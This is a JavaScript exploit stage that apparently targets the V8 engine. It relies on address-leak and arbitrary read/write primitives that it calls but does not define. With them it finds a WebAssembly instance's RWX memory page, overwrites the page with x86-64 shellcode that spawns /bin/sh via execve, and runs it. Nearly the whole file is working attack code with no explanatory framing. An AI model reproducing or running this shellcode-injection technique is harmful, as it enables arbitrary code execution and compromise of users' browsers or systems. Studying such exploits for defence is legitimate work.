/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// function dp(x){ %DebugPrint(x); }
// function bp() { %SystemBreak(); }

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

wasm_instance_addr = GetAddressOf(wasm_instance)
console.log("[+] wasm_instance: 0x" + wasm_instance_addr.toString(16));
var trusted_data_addr = ArbRead32(wasm_instance_addr+0x8+0x4)-1;
console.log("[+] trusted_data_addr: 0x" + trusted_data_addr.toString(16));
var rwx = BigInt(ArbRead32(trusted_data_addr+0x28)) + (BigInt(ArbRead32(trusted_data_addr+0x28+0x4))<<32n);
console.log("[*] rwx: 0x" + rwx.toString(16));

function copy(addr, data_arr) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = GetAddressOf(buf);
    console.log("[*] buf_addr: 0x" + buf_addr.toString(16));
    ArbWrite32(buf_addr+0x24, Number(addr));
    ArbWrite32(buf_addr+0x24+0x4, Number(addr >> 32n));

    for (let i = 0; i < data_arr.length; i++) {
        dataview.setBigUint64(8*i, data_arr[i], true);
    }
}

var shellcode = [
    0x48000000113d8d48n,
    0x003bb8d23148f631n,
    0x90909090050f0000n,
    0x0068732f6e69622fn,
];

copy(rwx, shellcode);

console.log("[+] executing execve('/bin/sh', 0, 0)");
f();